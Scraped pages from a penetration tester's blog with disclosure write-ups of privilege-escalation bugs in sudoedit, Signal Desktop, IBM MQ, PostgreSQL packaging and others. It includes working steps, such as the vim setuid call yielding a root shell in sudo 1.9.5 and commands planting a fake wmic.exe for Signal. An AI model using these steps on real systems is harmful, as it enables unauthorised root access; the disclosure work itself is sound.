[Linux](https://blog.mirch.io/tag/linux/)
[PostgreSQL](https://blog.mirch.io/tag/postgresql/)
[sudo hacking](https://blog.mirch.io/tag/sudo-hacking/)
[vulnerability](https://blog.mirch.io/tag/vulnerability/)
[Follow Rich Mirch on WordPress.com](https://blog.mirch.io)

* [GitHub](https://github.com/mirchr)
* [LinkedIn](https://www.linkedin.com/in/mirchr/)

[Create a website or blog at WordPress.com](https://wordpress.com/?ref=footer_custom_svg "Create a website or blog at WordPress.com")

* Subscribe
  Subscribed

  + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Rich Mirch](https://blog.mirch.io)

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fblog.mirch.io%252F2022%252F05%252F20%252Fexploiting-kaseya-unitrends-backup-appliance-part-1%252F)
* Privacy
* + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Rich Mirch](https://blog.mirch.io)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fblog.mirch.io%252F2022%252F05%252F20%252Fexploiting-kaseya-unitrends-backup-appliance-part-1%252F)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://blog.mirch.io)
  + [View site in Reader](https://wordpress.com/read/feeds/161645119)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

##

##

Loading Comments...

Write a Comment...

Email (Required)

Name (Required)

Website

###

![](https://pixel.wp.com/b.gif?v=noscript)



=== Content from blog.mirch.io_876decba_20250126_055322.html ===

[Skip to content](#content)

* [Home](/)
* [Vulnerability Research](https://blog.mirch.io/cve/)
* [Github](https://github.com/mirchr/security-research)
* [Twitter](https://twitter.com/0xm1rch)
* [About](https://blog.mirch.io/about/)

Search for:

[Rich Mirch](https://blog.mirch.io "Rich Mirch")
# [Rich Mirch](https://blog.mirch.io/ "Rich Mirch")

## Penetration Tester, Red Teamer, Security Researcher

Menu

[Exploiting Kaseya Unitrends Backup Appliance – Part 1 — May 20, 2022](https://blog.mirch.io/2022/05/20/exploiting-kaseya-unitrends-backup-appliance-part-1/ "Exploiting Kaseya Unitrends Backup Appliance – Part 1")

## [Exploiting Kaseya Unitrends Backup Appliance – Part 1](https://blog.mirch.io/2022/05/20/exploiting-kaseya-unitrends-backup-appliance-part-1/)

[May 20, 2022May 20, 2022](https://blog.mirch.io/2022/05/20/exploiting-kaseya-unitrends-backup-appliance-part-1/ "9:50 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

![](https://blog.mirch.io/wp-content/uploads/2022/05/unitrends-woot.png?w=889)

In 2021 I discovered several high and critical vulnerabilities in the [Kaseya Unitrends](https://www.unitrends.com/products/unitrends-backup-appliances) backup appliance. This research was conducted and published as part of my day job. Part one details a chain of vulnerabilities by leveraging an insecure [PostgreSQL](https://www.postgresql.org/) database to ultimately gain shell access to the remote server. Visit <https://www.cyberonesecurity.com/blog/exploiting-kaseya-unitrends-backup-appliance-part-1> for the the full write-up. Stay tuned for part two.

[sudoedit symlink fix for CVE-2021-23240 introduced new vulnerability — January 25, 2021](https://blog.mirch.io/2021/01/25/sudoedit-lpe/ "sudoedit symlink fix for CVE-2021-23240 introduced new vulnerability")

[![](https://blog.mirch.io/wp-content/uploads/2021/01/image-10.png?w=712)](https://blog.mirch.io/2021/01/25/sudoedit-lpe/ "sudoedit symlink fix for CVE-2021-23240 introduced new vulnerability")

## [sudoedit symlink fix for CVE-2021-23240 introduced new vulnerability](https://blog.mirch.io/2021/01/25/sudoedit-lpe/)

[January 25, 2021January 25, 2021](https://blog.mirch.io/2021/01/25/sudoedit-lpe/ "8:43 pm")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

I noticed the following changelog entry in sudo [1.9.5p1.](https://www.sudo.ws/stable.html#1.9.5p1) This caught my attention so I decided to look further. I was unable to find an advisory, PoC, or CVE for this vulnerability. Using the details from the changelog message and fix, I decided to write an exploit for it.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image.png?w=1024)

Using an Ubuntu 20.04.1 VM, I created a low privileged user named “lowpriv” and added a sudoedit rule for a root owned file /etc/test.txt. I also downloaded the [source](https://github.com/sudo-project/sudo/archive/SUDO_1_9_5.tar.gz) for sudo 1.9.5, compiled it, and installed it to /opt/sudo.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-3.png?w=1024)

Show sudoedit rule.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-1.png?w=1024)

Show the sudo version is 1.9.5.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-2.png?w=1024)

With the test environment ready I ran sudoedit /etc/test.txt. I executed !id as a quick test which executes the id command in a shell however privileges are dropped by bash when the UID != EUID. Back to the drawing board.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-5.png?w=1024)

I was able to successfully edit arbitrary files simply using the :e /etc/sudoers or :e /etc/shadow commands to escalate privileges, however that was too easy.

Looking for esoteric features that could potentially be leveraged, I discovered the libcall and libcallnr functions which allow you to execute a function from an external library. The one caveat is there can only be a single argument. There are a crazy amount of functions available to vim that I never realized. Check out <https://vim.help/41-write-a-vim-script#41.6> for the full listing.

I tried calling a variety of functions with varying degrees of success but found a simple method by calling [setuid()](https://man7.org/linux/man-pages/man2/setuid.2.html) directly.

`call libcallnr("libc.so.6","setuid",0)`

After running sudoedit, use the following vim/ex command to change the UID to zero. This will ensure that shelling out will retain privileges because now UID==EUID.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-8.png?w=1024)

Execute a bash shell with !bash.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-9.png?w=198)

Interactive root shell obtained. Woot!

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-10.png?w=1024)

I tested the same proof of concept with 1.9.5p1 and sudoedit properly drops privileges as expected.

![](https://blog.mirch.io/wp-content/uploads/2021/01/image-11.png?w=1024)

**Summary**

If you upgraded to sudo 1.9.5 to fix [CVE-2021-23240](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-23240) or [CVE-2021-23239](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-23239), a new privilege escalation vulnerability was introduced in sudoedit and you should upgrade to 1.9.5p1.

Once in a while I look at recently fixed vulnerabilities to see if I can bypass the fix. In this case, the sudo project knew about this vulnerably but to my knowledge no advisory or CVE was created. I think this is odd that the issue was not communicated since a valid privilege escalation was patched. It’s unclear if another researcher reported it or if maintainers discovered it during their own testing. I also could not find a proof of concept so I decided to write one as a fun exercise.

I hope you enjoyed the short write up. Hit me me up on Twitter [@0xm1rch](https://twitter.com/0xm1rch) if you have any questions or comments.

[Pi-hole Patches Critical Stored XSS Vulnerability — December 24, 2020](https://blog.mirch.io/2020/12/24/pihole-xss/ "Pi-hole Patches Critical Stored XSS Vulnerability")

[![](https://blog.mirch.io/wp-content/uploads/2020/12/piholexss.png?w=641)](https://blog.mirch.io/2020/12/24/pihole-xss/ "Pi-hole Patches Critical Stored XSS Vulnerability")

## [Pi-hole Patches Critical Stored XSS Vulnerability](https://blog.mirch.io/2020/12/24/pihole-xss/)

[December 24, 2020December 24, 2020](https://blog.mirch.io/2020/12/24/pihole-xss/ "10:03 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

Pi-hole v5.2.1 is vulnerable to a critical stored cross site scripting vulnerability. An attacker with the ability to directly or indirectly query DNS with a malicious hostname can cause arbitrary JavaScript to execute when the Pi-hole administrator accesses the Query Log or Long-term Query Log pages on the web portal.

The Pi-hole project released a fix on 12/24/2020 in v5.2.2. Shodan reports over 7,500 Pi-hole instances. This could be remotely exploited if these instances permit external DNS queries. Other possibilities may exist if a malformed DNS query is allowed.

No payloads are being published at this time to give users time to patch.

**References**

* <https://github.com/pi-hole/AdminLTE/pull/1665>

**Timeline**

* 12/16/2020 Vulnerability reported to vendor
* 12/18/2020 Vendor acknowledged receipt of report
* 12/22/2020 Discovered a second XSS payload that would fire on the Long-term Queries Page
* 12/23/2020 Mitre assigns CVE-2020-35659
* 12/24/2020 Vendor released fix in v5.2.2

[Metasploit module developed for CVE-2018-18556 VyOS Privilege Escalation — September 25, 2020](https://blog.mirch.io/2020/09/25/metasploit-module-developed-for-cve-2018-18556-vyos-privilege-escalation/ "Metasploit module developed for CVE-2018-18556 VyOS Privilege Escalation")

## [Metasploit module developed for CVE-2018-18556 VyOS Privilege Escalation](https://blog.mirch.io/2020/09/25/metasploit-module-developed-for-cve-2018-18556-vyos-privilege-escalation/)

[September 25, 2020September 25, 2020](https://blog.mirch.io/2020/09/25/metasploit-module-developed-for-cve-2018-18556-vyos-privilege-escalation/ "3:52 pm")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

Today, a Metasploit module was merged for a vulnerability I found in 2018 with [VyOS](https://www.vyos.io/). This vulnerability was my first public InfoSec blog post. I appreciate [bcoles](https://github.com/bcoles) for developing the [exploit/linux/ssh/vyos\_restricted\_shell\_privesc](https://github.com/rapid7/metasploit-framework/pull/14123) module. Read the [Metasploit Wrapup for 9/25/2020](https://blog.rapid7.com/2020/09/25/metasploit-wrap-up-80/). The full write-up can can be found on this blog at [C](https://blog.mirch.io/2018/11/05/cve-2018-18556-vyos-privilege-escalation-via-sudo-pppd-for-operator-users/)[VE-2018-18556 – VyOS Privilege escalation via sudo pppd for operator users](https://blog.mirch.io/2018/11/05/cve-2018-18556-vyos-privilege-escalation-via-sudo-pppd-for-operator-users/).

[Critical Vulnerabilities Discovered in MoFi Routers — September 2, 2020](https://blog.mirch.io/2020/09/02/critical-vulnerabilities-discovered-in-mofi-routers/ "Critical Vulnerabilities Discovered in MoFi Routers")

## [Critical Vulnerabilities Discovered in MoFi Routers](https://blog.mirch.io/2020/09/02/critical-vulnerabilities-discovered-in-mofi-routers/)

[September 2, 2020](https://blog.mirch.io/2020/09/02/critical-vulnerabilities-discovered-in-mofi-routers/ "1:08 pm")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

I discovered several vulnerabilities in the MoFi4500 LTE router. Several vulnerabilities have not been patched, including an unauthenticated remote command injection and several undocumented backdoors. The full write-up can be viewed at <https://www.criticalstart.com/critical-vulnerabilities-discovered-in-mofi-routers/>.

Media Coverage

* <https://www.cyberscoop.com/mofi-networks-routers-zero-day-critical-start/>
* <https://www.zdnet.com/article/backdoors-left-unpatched-in-mofi-routers/>

Follow the conversation on Twitter

> The team is at it again! This time with 10 [#0days](https://twitter.com/hashtag/0days?src=hash&ref_src=twsrc%5Etfw) found by [@0xm1rch](https://twitter.com/0xm1rch?ref_src=twsrc%5Etfw) for routers from [@MoFiNetwork](https://twitter.com/MoFiNetwork?ref_src=twsrc%5Etfw). After coordinating with others to reduce impact there still appears to be over 6,860 vulnerable devices externally facing.[#Infosec](https://twitter.com/hashtag/Infosec?src=hash&ref_src=twsrc%5Etfw) [#redteam](https://twitter.com/hashtag/redteam?src=hash&ref_src=twsrc%5Etfw)<https://t.co/1A1UgRmJrq> [pic.twitter.com/YKPiF4LFMq](https://t.co/YKPiF4LFMq)
>
> — TeamARES (@TeamAresSec) [September 2, 2020](https://twitter.com/TeamAresSec/status/1301200248417775618?ref_src=twsrc%5Etfw)

[CVE-2020-3950 VMware Fusion Elevation of Privilege — March 17, 2020](https://blog.mirch.io/2020/03/17/cve-2020-3950-vmware-fusion-elevation-of-privilege/ "CVE-2020-3950 VMware Fusion Elevation of Privilege")

[![](https://blog.mirch.io/wp-content/uploads/2020/03/vmware-fusion-cve-2020-3950-cropped.png?w=712)](https://blog.mirch.io/2020/03/17/cve-2020-3950-vmware-fusion-elevation-of-privilege/ "CVE-2020-3950 VMware Fusion Elevation of Privilege")

## [CVE-2020-3950 VMware Fusion Elevation of Privilege](https://blog.mirch.io/2020/03/17/cve-2020-3950-vmware-fusion-elevation-of-privilege/)

[March 17, 2020April 3, 2020](https://blog.mirch.io/2020/03/17/cve-2020-3950-vmware-fusion-elevation-of-privilege/ "10:55 pm")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

VMware Fusion 11.5.~~1~~2 and prior are vulnerable to an elevation of privilege vulnerability. For more details please review the advisory and proof of concept on my Github page [CVE-2020-3950.sh](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2020-3950.sh). VMware released a the patch last week and a public advisory [VMSA-2020-0005](https://www.vmware.com/security/advisories/VMSA-2020-0005.html) today however it has been determined that the patch does not properly fix the vulnerability. I reached out to the VMware security team and received a response at 10:31 UTC 2020-03-18 – “We are aware of the situation and working on the next steps”.

I also learned today that [Jeff Ball](https://twitter.com/jeffball55) at [GRIMM](https://twitter.com/grimmcyber) also independently discovered and reported the vulnerability to VMware.  This is a first for me. Make sure to read their excellent detailed write-up <https://blog.grimm-co.com/post/analyzing-suid-binaries/>. You can also follow the thread on Twitter.

> PoC for CVE-2020-3950 VMware Fusion EoP. <https://t.co/F0jGnE9BZu> Vendor Advisory: <https://t.co/28f3aoAFsG> [pic.twitter.com/5WYG9xg5cv](https://t.co/5WYG9xg5cv)
>
> — Rich Mirch (@0xm1rch) [March 17, 2020](https://twitter.com/0xm1rch/status/1240030085450731521?ref_src=twsrc%5Etfw)

### **Related Articles**

* BleepingComputer [VMware Fixes High Severity Privilege Escalation Bug in Fusion](https://www.bleepingcomputer.com/news/security/vmware-fixes-high-severity-privilege-escalation-bug-in-fusion/)
* ZDNet [VMware patches privilege escalation vulnerability in Fusion, Horizon](https://www.zdnet.com/article/vmware-patches-privilege-escalation-vulnerability-in-workstation-fusion-horizon/)
* SecurityWeek [VMware Fixes Privilege Escalation Vulnerability in Fusion for Mac](https://www.securityweek.com/vmware-fixes-privilege-escalation-vulnerability-fusion-mac)
* SecurityWeek [Patch for Recently Disclosed VMware Fusion Vulnerability Incomplete](https://www.securityweek.com/recent-patch-vmware-fusion-vulnerability-incomplete)
* SecurityWeek [VMware Again Fails to Patch Privilege Escalation Vulnerability in Fusion](https://www.securityweek.com/vmware-again-fails-patch-privilege-escalation-vulnerability-fusion)
* Metasploit Module [Blown up by your own Fusion bomb](https://blog.rapid7.com/2020/04/03/metasploit-wrap-up-58/)

[CVE-2019-19954 Signal Desktop Windows Elevation of Privilege Vulnerability — December 18, 2019](https://blog.mirch.io/2019/12/18/signal-desktop-windows-lpe/ "CVE-2019-19954 Signal Desktop Windows Elevation of Privilege Vulnerability")

## [CVE-2019-19954 Signal Desktop Windows Elevation of Privilege Vulnerability](https://blog.mirch.io/2019/12/18/signal-desktop-windows-lpe/)

[December 18, 2019August 6, 2020](https://blog.mirch.io/2019/12/18/signal-desktop-windows-lpe/ "7:25 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

# Vulnerability Summary

Signal Desktop v1.29 on Windows is vulnerable to an elevation of privilege vulnerability. During the startup the application will execute the c:\node\_modules\.bin\wmic.exe binary if it exists. By default on Windows, low privileged users have the privilege to create folders under root level drives. A low privileged user can create a malicious wmic.exe which will be executed every time Signal Desktop starts by any user of the system. The malicious binary is executed in the background without the users knowledge. This is an example of horizontal [privilege escalation](https://en.wikipedia.org/wiki/Privilege_escalation).

The vulnerability has been patched in v1.29.1 in commit [2da39c](https://github.com/signalapp/Signal-Desktop/commit/2da39cca673cc11be3c6d70d4fb95889f9ab6688) which was released 12/17/2019. Kudos to the Signal security team for fixing in less than two weeks! Unfortunately, at this time the they do not feel this warrants an advisory or CVE so the vulnerability was silently fixed. **12/24/2019 Update:** Mitre assigned CVE-2019-19954

## Steps To Reproduce

In a cmd window

```
mkdir c:\node_modules\.bin
copy c:\windows\system32\calc.exe c:\node_modules\.bin\wmic.exe

```

Now any user that opens Signal, the Windows calculator will be popped.

## PoC

![signal-lpe-3](https://blog.mirch.io/wp-content/uploads/2020/08/signal-lpe-3.png)

## Timeline

* 2019-12-05: Report sent to Signal security team
* 2019-12-11: Reached out to Signal to verify report was received
* 2019-12-16: Signal acknowledges report
* 2019-12-17: Signal v1.29.1 released
* 2019-12-18: Published this blog post
* 2019-12-24: MITRE assigned CVE-2019-19954

## References

* Commit: [2da39c](https://github.com/signalapp/Signal-Desktop/commit/2da39cca673cc11be3c6d70d4fb95889f9ab6688)
* Vulnerable version: <https://updates.signal.org/desktop/signal-desktop-win-1.29.0.exe>

[CVE-2019-3466 Debian / Ubuntu Privilege Escalation via pg\_ctlcluster — November 15, 2019](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/ "CVE-2019-3466 Debian / Ubuntu Privilege Escalation via pg_ctlcluster")

[![](https://blog.mirch.io/wp-content/uploads/2019/11/debian-buster-postgres-root.png?w=712)](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/ "CVE-2019-3466 Debian / Ubuntu Privilege Escalation via pg_ctlcluster")

## [CVE-2019-3466 Debian / Ubuntu Privilege Escalation via pg\_ctlcluster](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/)

[November 15, 2019November 15, 2019](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/ "6:54 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

# Vulnerability Summary

The [pg\_ctlcluster](https://manpages.debian.org/buster/postgresql-common/pg_ctlcluster.1.en.html) script in the postgresql-common package in Debian and Ubuntu is vulnerable to a local privilege escalation attack. pg\_ctlcluster is a script used to manage PostgreSQL instances. A malicious actor with access to the postgres account can create arbitrary directories during startup or reload when called via systemd. This vulnerability can be leveraged to escalate privileges to root.

It’s important to note this is not a vulnerability in PostgreSQL and is specific to Debian, Ubuntu, or any system that consumes the Debian postgresql-common package.

A [fix](https://salsa.debian.org/postgresql/postgresql-common/commit/ec9d984b62ed79f61be97b786a9ff4381309979c) is now available. Administrators should upgrade to the latest version of the postgresql-common package. See the Debian [security tracker](https://security-tracker.debian.org/tracker/source-package/postgresql-common) for details.

The vulnerability appears to have existed since 2013 based on the Debian Git history ([9dc97b,](https://salsa.debian.org/postgresql/postgresql-common/commit/9dc97be33f1f116ae6e2f17bd05cb6a2baf274a9) [e97d16](https://salsa.debian.org/postgresql/postgresql-common/commit/e97d163c85c6df7e30ecc346eec007da2cd7e688)). I attempted to reproduce it on Wheezy but was unable to verify it due to unrelated technical issues standing up a test environment.

This proof of concept will show the ability to gain root privileges using the default

installation of  postgresql-common v200+deb10u2 along with postgresql-11 on Debian Buster. I have also verified the vulnerability on Ubuntu 19.04 with version 199 of the postgresql-common package.

---

## Walkthrough

The postgresql init script(/etc/init.d/postgresql) sources [init.d-functions](https://salsa.debian.org/postgresql/postgresql-common/blob/master/debian/init.d-functions) which contain functions that call the pg\_ctlcluster script. pg\_ctlcluster loads the following configuration files determined by the [Pgcommon](https://salsa.debian.org/postgresql/postgresql-common/blob/master/PgCommon.pm) module.

* /etc/postgresql/cluster-version/cluster-name/pg\_ctl.conf
* /etc/postgresql/cluster-version/cluster-name/postgresql.conf
* /var/lib/postgresql/cluster-version/cluster-name/postgresql.auto.conf

These files are owned by the postgres user. The postgresql.auto.conf file will override the settings from /etc/postgresql. This file is created when the [alter system](https://www.postgresql.org/docs/current/sql-altersystem.html) command is executed.

pg\_ctlcluster contains logic to create directories for socketdir(defined in pg\_ctl.conf) and stats\_temp\_directory(defined in postgresql.conf). During a start or reload, if the directories defined in either of these variables do not exist, pg\_ctlcluster will create it and set the owner to the postgres user.

[Continue reading →](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/#more-333)

[CVE-2018-1792 – IBM MQ Privilege Escalation: Fun with RUNPATH — August 25, 2019](https://blog.mirch.io/2019/08/25/cve-2018-1792-ibm-mq-privilege-escalation-fun-with-runpath/ "CVE-2018-1792 – IBM MQ Privilege Escalation: Fun with RUNPATH")

[![](https://blog.mirch.io/wp-content/uploads/2019/08/mqm-woot-4.png?w=712)](https://blog.mirch.io/2019/08/25/cve-2018-1792-ibm-mq-privilege-escalation-fun-with-runpath/ "CVE-2018-1792 – IBM MQ Privilege Escalation: Fun with RUNPATH")

## [CVE-2018-1792 – IBM MQ Privilege Escalation: Fun with RUNPATH](https://blog.mirch.io/2019/08/25/cve-2018-1792-ibm-mq-privilege-escalation-fun-with-runpath/)

[August 25, 2019August 25, 2019](https://blog.mirch.io/2019/08/25/cve-2018-1792-ibm-mq-privilege-escalation-fun-with-runpath/ "11:37 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")/[Leave a comment](https://blog.mirch.io/2019/08/25/cve-2018-1792-ibm-mq-privilege-escalation-fun-with-runpath/#respond)

# Vulnerability Summary

[IBM MQ](https://en.wikipedia.org/wiki/IBM_MQ) for Linux and UNIX systems is vulnerable to a privilege escalation attack by forcing a setuid root binary to load a malicious library. A local attacker with access to the mqm account can execute arbitrary code as root. In October 2018 IBM published an [advisory](https://www-01.ibm.com/support/docview.wss?uid=ibm10734447) along with patches for several versions.

The goal of this post is to show how the [RPATH/RUNPATH](https://en.wikipedia.org/wiki/Rpath) value could potentially be leveraged for privilege escalation. When specified at compile time this path is embedded in the binary and is the first path searched when searching for a library if the dependent library specified does contain a slash. Details on how this works can be found in the [ld.so](http://man7.org/linux/man-pages/man8/ld.so.8.html) man page.

As with most file path type vulnerabilities, if you control the path, you may control the application in some way. In this case the mqm user is the owner of the directories listed in the RUNPATH.

---

## Walkthrough

List setuid root applications.

```
[mqm@localhost]$ find /opt/mqm -perm -4000 -user root|xargs ls -l
-r-sr-x---. 1 root mqm 13384 Jul 9 07:09 /opt/mqm/bin/security/amqoamax
-r-sr-x---. 1 root mqm 13704 Jul 9 07:09 /opt/mqm/bin/security/amqoampx

```

Use [readelf](http://man7.org/linux/man-pages/man1/readelf.1.html) to read the dynamic section to extract the RPATH/RUNPATH.

```
[mqm@localhost ~]$ readelf -d /opt/mqm/bin/security/amqoamax |grep -e RPATH -e RUNPATH
0x000000000000001d (RUNPATH) Library runpath: [/opt/mqm/lib64:/opt/mqm/gskit8/lib64:/

```

Using my favorite utility [strace](http://man7.org/linux/man-pages/man1/strace.1.html), we can see the open() calls for libm.so.6 fails with ENOENT under /opt/mqm/lib64 and /opt/mqm/gskit8.  We’re using libm.so.6 for this PoC but other libraries can be used. The dependency is ultimately resolved at /usr/lib64/libm.so.6. This gets interesting because the mqm user owns the directories under /opt/mqm.

```
[mqm@localhost ~]$ strace -f /opt/mqm/bin/security/amqoamax 2>&1|grep libm.so
open("/opt/mqm/lib64/libm.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
open("/opt/mqm/gskit8/lib64/libm.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
open("/usr/lib64/libm.so.6", O_RDONLY|O_CLOEXEC) = 3

```

[Continue reading →](https://blog.mirch.io/2019/08/25/cve-2018-1792-ibm-mq-privilege-escalation-fun-with-runpath/#more-165)

[CVE-2019-12572 PIA Windows Privilege Escalation: Malicious OpenSSL Engine — June 10, 2019](https://blog.mirch.io/2019/06/10/cve-2019-12572-pia-windows-privilege-escalation-malicious-openssl-engine/ "CVE-2019-12572 PIA Windows Privilege Escalation: Malicious OpenSSL Engine")

[![](https://blog.mirch.io/wp-content/uploads/2019/06/woot-cmd.png?w=659)](https://blog.mirch.io/2019/06/10/cve-2019-12572-pia-windows-privilege-escalation-malicious-openssl-engine/ "CVE-2019-12572 PIA Windows Privilege Escalation: Malicious OpenSSL Engine")

## [CVE-2019-12572 PIA Windows Privilege Escalation: Malicious OpenSSL Engine](https://blog.mirch.io/2019/06/10/cve-2019-12572-pia-windows-privilege-escalation-malicious-openssl-engine/)

[June 10, 2019June 20, 2019](https://blog.mirch.io/2019/06/10/cve-2019-12572-pia-windows-privilege-escalation-malicious-openssl-engine/ "7:13 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")/[1 Comment](https://blog.mirch.io/2019/06/10/cve-2019-12572-pia-windows-privilege-escalation-malicious-openssl-engine/#comments)

## **Vulnerability Summary**

During startup the PIA Windows service(pia-service.exe) loads the OpenSSL library from C:\Program Files\Private Internet Access\libeay32.dll. This library attempts to load the C:\etc\ssl\openssl.cnf configuration file. By default on Windows systems, authenticated users can create directories under C:\. A low privileged user can create a openssl.cnf configuration file to load a malicious OpenSSL engine library resulting in the arbitrary code execution as SYSTEM when the service starts.

The root cause is when the OpenSSL libraries were built, the [OPENSSLDIR](https://wiki.openssl.org/index.php/Compilation_and_Installation#PREFIX_and_OPENSSLDIR) parameter was set to a path which a low privileged user can modify or create. I believe this issue is lurking in many Window applications that bundle OpenSSL libraries. I have discovered the same vulnerability in several other Windows applications and will be disclosing those findings when patches are available.

I created a simple tool to help identify potentially vulnerable OpenSSL libraries –<https://github.com/mirchr/openssldir_check>.

CVE-2019-12572 has been patched in v1.2.1. The latest Windows desktop client can be upgraded automatically via the application or manually from the download page at [Private Internet Access](https://www.privateinternetaccess.com/pages/download).

---

### **Walkthrough**

While hunting for potential vulnerabilities in the Windows Private Internet Access desktop application I noticed a failed call to open the c:\etc\ssl\openssl.cnf file during the service startup.

![pia-openssl-failed-open](https://blog.mirch.io/wp-content/uploads/2019/06/pia-openssl-failed-open.png)

This caught my attention and I needed to research this further. But before I get into the details of that, let’s take a step back and see how I arrived there.

[Continue reading →](https://blog.mirch.io/2019/06/10/cve-2019-12572-pia-windows-privilege-escalation-malicious-openssl-engine/#more-259)

## Posts navigation

[Older posts](https://blog.mirch.io/page/2/)

### Tags

[exploit](https://blog.mirch.io/tag/exploit/)
[hacking sudo](https://blog.mirch.io/tag/hacking-sudo/)
[Linux](https://blog.mirch.io/tag/linux/)
[PostgreSQL](https://blog.mirch.io/tag/postgresql/)
[sudo hacking](https://blog.mirch.io/tag/sudo-hacking/)
[vulnerability](https://blog.mirch.io/tag/vulnerability/)
[Follow Rich Mirch on WordPress.com](https://blog.mirch.io)

* [GitHub](https://github.com/mirchr)
* [LinkedIn](https://www.linkedin.com/in/mirchr/)

[Create a website or blog at WordPress.com](https://wordpress.com/?ref=footer_custom_svg "Create a website or blog at WordPress.com")

* Subscribe
  Subscribed

  + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Rich Mirch](https://blog.mirch.io)

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fblog.mirch.io%252F2022%252F05%252F20%252Fexploiting-kaseya-unitrends-backup-appliance-part-1%252F)
* Privacy
* + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Rich Mirch](https://blog.mirch.io)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fblog.mirch.io%252F2022%252F05%252F20%252Fexploiting-kaseya-unitrends-backup-appliance-part-1%252F)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://blog.mirch.io)
  + [View site in Reader](https://wordpress.com/read/feeds/161645119)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

##

##

Loading Comments...

Write a Comment...

Email (Required)

Name (Required)

Website

###

![](https://pixel.wp.com/b.gif?v=noscript)



=== Content from blog.mirch.io_ed2774a8_20250126_055314.html ===

[Skip to content](#content)

* [Home](/)
* [Vulnerability Research](https://blog.mirch.io/cve/)
* [Github](https://github.com/mirchr/security-research)
* [Twitter](https://twitter.com/0xm1rch)
* [About](https://blog.mirch.io/about/)

Search for:

[Rich Mirch](https://blog.mirch.io "Rich Mirch")
# [Rich Mirch](https://blog.mirch.io/ "Rich Mirch")

## Penetration Tester, Red Teamer, Security Researcher

Menu

[CVE-2018-18556 – VyOS Privilege escalation via sudo pppd for operator users — November 5, 2018](https://blog.mirch.io/2018/11/05/cve-2018-18556-vyos-privilege-escalation-via-sudo-pppd-for-operator-users/ "CVE-2018-18556 – VyOS Privilege escalation via sudo pppd  for operator users")

## [CVE-2018-18556 – VyOS Privilege escalation via sudo pppd for operator users](https://blog.mirch.io/2018/11/05/cve-2018-18556-vyos-privilege-escalation-via-sudo-pppd-for-operator-users/)

[November 5, 2018May 3, 2019](https://blog.mirch.io/2018/11/05/cve-2018-18556-vyos-privilege-escalation-via-sudo-pppd-for-operator-users/ "10:39 pm")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

Recently I found several ways to escape the restricted shell for an operator user in [VyOS](https://wiki.vyos.net/wiki/User_Guide) 1.1.8. VyOS is a Linux-based network operating system that provides software-based network routing, firewall, and VPN functionality. I plan to post information on the restricted shell escapes in the near future; For now read the [blog](http://blog.vyos.net/the-operator-level-is-proved-insecure-and-will-be-removed-in-the-next-releases) by [@dmbaturin](http://twitter.com/dmbaturin) detailing some of the methods.

This post will focus how root access was obtained using sudo after the restricted shell was escaped. One of my first post exploitation steps on Linux after a low privileged shell is obtained is to check if the user has sudo rules configured. Sudo is designed to limit privileges but often times it can be leveraged to elevate access.

